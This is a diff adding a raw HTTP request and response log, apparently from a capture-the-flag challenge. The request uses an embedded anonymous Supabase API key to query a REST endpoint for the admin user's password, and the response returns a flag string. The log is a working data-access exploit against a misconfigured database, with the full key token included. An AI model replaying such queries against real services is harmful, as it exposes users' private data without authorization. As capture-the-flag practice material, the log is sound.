@@ -1,0 +1,27 @@
+GET /rest/v1/users?select=password&username=eq.admin HTTP/2
+Host: dpyxnwiuwzahkxuxrojp.supabase.co
+Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImRweXhud2l1d3phaGt4dXhyb2pwIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NTE3NjA1MDcsImV4cCI6MjA2NzMzNjUwN30.C3-ninSkfw0RF3ZHJd25MpncuBdEVUmWpMLZgPZ-rqI
+Apikey: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImRweXhud2l1d3phaGt4dXhyb2pwIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NTE3NjA1MDcsImV4cCI6MjA2NzMzNjUwN30.C3-ninSkfw0RF3ZHJd25MpncuBdEVUmWpMLZgPZ-rqI
+
+
+HTTP/2 200 OK
+Date: Sat, 06 Sep 2025 11:27:48 GMT
+Content-Type: application/json; charset=utf-8
+Content-Length: 53
+Content-Range: 0-0/*
+Cf-Ray: 97ad9e85ed31d117-CDG
+Cf-Cache-Status: DYNAMIC
+Content-Location: /users?select=password&username=eq.admin
+Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
+Content-Profile: public
+Sb-Gateway-Version: 1
+Sb-Project-Ref: dpyxnwiuwzahkxuxrojp
+Sb-Request-Id: 01991ec8-4fbb-74e3-ba59-e119e80cf898
+X-Content-Type-Options: nosniff
+X-Envoy-Attempt-Count: 1
+X-Envoy-Upstream-Service-Time: 1
+Set-Cookie: __cf_bm=GzrsGbR0qLTGbyQXfkPlFHZap18qhCj_b4DIqnqJlKs-1757158068-1.0.1.1-23A2uReeIcv2i_9vXl.u.4Nvkox0qbDROn_XkBR0mt05yw.Hk08gP47ObqX3ruZYGpdEGVBjM55Chc7uHI__HPrmL.d1MzRUlYA0V.EJeZw; path=/; expires=Sat, 06-Sep-25 11:57:48 GMT; domain=.supabase.co; HttpOnly; Secure
+Server: cloudflare
+Alt-Svc: h3=":443"; ma=86400
+
+[{"password":"ictf{why_d1d_1_g1v3_u_my_@p1_k3y???}"}]
